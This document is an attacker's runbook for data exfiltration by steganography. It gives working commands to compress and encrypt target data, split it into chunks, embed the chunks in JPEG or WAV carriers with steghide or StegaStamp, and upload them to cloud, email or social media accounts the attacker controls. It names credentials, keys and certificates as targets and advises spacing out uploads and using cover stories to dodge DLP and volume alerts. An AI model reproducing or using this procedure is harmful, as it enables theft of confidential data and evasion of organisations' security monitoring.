# Runbook: data exfiltration via steganography

Encoding sensitive files into images or audio and extracting them through a channel that
does not raise alerts. The goal is to move data from a network that inspects outbound
traffic for suspicious file types or keywords, using carrier files that attract no scrutiny.

## Scope and trade-offs

Steganographic exfiltration is slow compared to direct file transfer. At roughly 100KB of
payload per image (using steghide at conservative density), exfiltrating a 100MB file
requires around 1000 images, which takes time and generates detectable upload patterns.

Use steganographic exfiltration for:

- High-value, small-volume targets: credentials, keys, certificates, configuration files
- Environments where direct file transfer is blocked and DNS exfiltration is monitored
- Situations where you need the exfiltrated content to arrive undetected in a monitored inbox

For large file exfiltration, a standard HTTPS tunnel or DNS exfiltration channel will
generally be faster and less operationally complex.

## Prepare the data

Compress and encrypt the target data first:

```text
tar czf - /path/to/target/dir | openssl enc -aes-256-cbc -pbkdf2 -k 'exfil_key' > exfil.enc
```

Check the size:

```text
wc -c exfil.enc
```

For files under 50KB, single-image embedding is feasible. For larger files, split into
chunks:

```text
split -b 40000 exfil.enc chunk_
ls chunk_*
```

## Embed into a carrier image set

Prepare a set of natural photographs as cover images. Number them to match the chunks.
Ensure all covers are JPEG (steghide works with JPEG without requiring format conversion).

Embed each chunk:

```bash
PASS='exfil_channel_pass'
i=0
for chunk in chunk_*; do
    cp "cover_${i}.jpg" "carrier_${i}.jpg"
    steghide embed -cf "carrier_${i}.jpg" -sf "$chunk" -p "$PASS" -f -z 9
    i=$((i + 1))
done
```

Verify:

```bash
i=0
for chunk in chunk_*; do
    steghide extract -sf "carrier_${i}.jpg" -p "$PASS" -xf "verify_${i}" -f
    diff "$chunk" "verify_${i}" || echo "MISMATCH: $i"
    i=$((i + 1))
done
echo "All verified"
```

## Transfer the carrier images

Options for outbound transfer through monitored networks:

Upload to a cloud storage or photo sharing service. A bulk upload of holiday photographs
does not trigger DLP rules looking for document types or keywords. Post them to an
attacker-controlled account retrieved later.

Email as attachments over time. Spacing uploads and emails over hours or days avoids
volume-based alerts. Use a webmail account accessed via a browser on the target to avoid
leaving mail client artefacts.

Post to a social media account. Instagram, Flickr, and similar platforms accept JPEG
uploads. Note that many platforms recompress uploaded images, which will corrupt steghide
payloads. Test your target platform's compression behaviour before relying on this.

For platforms that apply JPEG recompression, use a method that survives it. StegaStamp is
designed for robustness to moderate distortion; test with:

```text
python encode_image.py --image cover.png --secret "$(head -c 12 chunk_0 | xxd -b ...)" --output carrier_0.png
# upload carrier_0.png, download the platform's stored version, then:
python decode_image.py --image downloaded_carrier_0.jpg
```

If the decoded bits match, the platform's compression is within the model's tolerance.

## Reconstruct on the attacker side

Download all carrier images from the collection point. Extract each chunk:

```bash
PASS='exfil_channel_pass'
for i in $(seq 0 $((NUM_CARRIERS - 1))); do
    steghide extract -sf "carrier_${i}.jpg" -p "$PASS" -xf "chunk_${i}" -f
done
```

Reassemble and decrypt:

```text
cat chunk_* | openssl enc -aes-256-cbc -d -pbkdf2 -k 'exfil_key' | tar xzf -
```

## Audio carrier variant

For environments that block image uploads but allow audio files (voice memo services,
podcast platforms, audio attachment in messaging apps):

```text
# steghide supports WAV and AU
steghide embed -cf carrier.wav -sf chunk_0 -p 'exfil_channel_pass' -f
```

WAV files are uncompressed and survive platform storage without data loss. Audio exfiltration
is slower per file (typical WAV files are large relative to their payload capacity) but
works in image-restricted environments.

## Detection footprint

Indicators that a defender might see:

- Bulk upload of images to cloud storage in a short window
- Repeated access to cloud storage or photo platforms from an endpoint that does not normally use them
- Image files on disk that do not match known cover photos (metadata mismatch, unusual file names)
- steghide binary or related Python libraries present on the endpoint

Space uploads over time and use cover stories for the upload activity (a user uploading
photos from a work trip, an automated backup) to reduce volume-based alerts.
